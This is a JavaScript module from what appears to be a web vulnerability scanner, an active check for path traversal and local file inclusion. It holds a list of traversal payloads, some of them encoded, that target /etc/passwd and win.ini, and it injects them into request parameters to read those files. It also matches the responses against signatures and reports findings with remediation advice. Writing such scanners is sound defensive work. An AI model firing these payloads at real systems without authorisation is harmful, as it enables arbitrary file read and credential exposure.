import { buildCorpus, insertionPoints, mutate, send, pointLabel } from '../http/insertion.js';

const PAYLOADS = [
  '../../../../../../../../etc/passwd',
  '....//....//....//....//....//etc/passwd',
  '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '/etc/passwd',
  '..\\..\\..\\..\\..\\..\\windows\\win.ini',
  '..%5c..%5c..%5c..%5cwindows%5cwin.ini',
];

const SIGNATURES = [
  { re: /root:.*?:0:0:/, what: '/etc/passwd contents (root:...:0:0:)' },
  { re: /daemon:.*?:\/usr\/sbin/, what: '/etc/passwd contents (daemon entry)' },
  { re: /\[fonts\]|\[extensions\]|for 16-bit app support/i, what: 'Windows win.ini contents' },
];

const FILE_HINT = /file|path|page|doc|template|tpl|include|dir|folder|load|download|dl|view|read|name|src|img|image|pdf|report|log|conf|config|lang|locale|style|theme/i;

export default {
  id: 'path-traversal',
  name: 'Path traversal / local file inclusion',
  phase: 'active',
  intrusive: 'medium',
  async run({ site, findings, http, target, opts }) {
    const corpus = buildCorpus(site, target, opts).filter((r) => r.method !== 'DELETE');
    const all = [];
    for (const req of corpus) for (const point of insertionPoints(req)) all.push({ req, point });
    const prioritized = [
      ...all.filter((x) => FILE_HINT.test(pointName(x.point))),
      ...all.filter((x) => !FILE_HINT.test(pointName(x.point))),
    ].slice(0, opts.maxActiveTargets ?? 50);

    const seen = new Set();
    for (const { req, point } of prioritized) {
      const pk = `${req.method} ${req.url.split('?')[0]} ${pointLabel(req, point)}`;
      if (seen.has(pk)) continue;
      seen.add(pk);

      for (const payload of PAYLOADS) {
        const res = await send(http, mutate(req, point, payload));
        if (!res.ok || !res.body) continue;
        const sig = SIGNATURES.find((s) => s.re.test(res.body));
        if (sig) {
          findings.add({
            id: 'path-traversal',
            title: `Path traversal in ${pointLabel(req, point)}`,
            severity: 'high',
            url: req.url,
            evidence: `A traversal sequence in ${pointLabel(req, point)} returned ${sig.what}.`,
            impact:
              'The application reads a file path built from user input, allowing arbitrary file read (credentials, source, config) and sometimes RCE via includes.',
            remediation:
              'Resolve paths against a fixed base directory and reject anything that escapes it; map input to an allowlist of identifiers.',
            cwe: 'CWE-22',
            poc: `Set ${pointLabel(req, point)} to ${payload} → response contains ${sig.what}.`,
            references: ['https://owasp.org/www-community/attacks/Path_Traversal'],
            confidence: 0.9,
          });
          return;
        }
      }
    }
  },
};

function pointName(point) {
  return point.name || (point.path ? point.path.join('.') : '');
}
